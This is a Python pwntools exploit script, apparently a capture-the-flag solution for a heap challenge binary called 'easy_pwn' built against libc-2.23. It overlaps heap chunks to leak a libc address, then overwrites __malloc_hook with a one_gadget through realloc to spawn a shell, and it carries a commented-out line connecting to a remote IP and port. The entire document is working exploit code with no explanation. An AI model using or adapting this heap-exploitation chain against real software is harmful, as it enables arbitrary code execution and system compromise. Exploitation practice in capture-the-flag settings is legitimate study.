from pwn import *
context.log_level="debug"
libc = ELF("./libc-2.23.so")
p = process("./easy_pwn")
#p = remote("39.97.182.233", 41078)
def add(size):
    p.sendlineafter(": ", "1")
    p.sendlineafter(": ", str(size))

def edit(idx, size, content):
    p.sendlineafter(": ", "2")
    p.sendlineafter(": ", str(idx))
    p.sendlineafter(": ", str(size))
    p.sendafter(": ", content)

def free(idx):
    p.sendlineafter(": ","3")
    p.sendlineafter(": ", str(idx))

def show(idx):
    p.sendlineafter(": ", "4")
    p.sendlineafter(": ", str(idx))

def dbg():
	gdb.attach(p)
	p.interactive()

def exp():
	add(0x80)#0
	add(0x68)#1
	add(0x80)#2
	add(0x20)#3
	add(0x20)#4
	free(0)	
	edit(1, 0x68+10, '\x00'*0x60+p64(0x100)+'\xc0')
	free(2)
	add(0x80)#0
	show(1)
	libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00'*2)-0x3c4b78
	log.success("libc_base == > " + hex(libc_base))
	malloc_hook = libc_base + libc.sym['__malloc_hook']-0x23
	realloc = libc_base + libc.sym['realloc']
	add(0x68)#2
	free(2)	
	edit(1, 8, p64(malloc_hook))
	add(0x68)
	add(0x68)
	edit(5, 0x18+3, 'aaa'+p64(0)+p64(libc_base+0xf1147)+p64(realloc+4))
	#dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
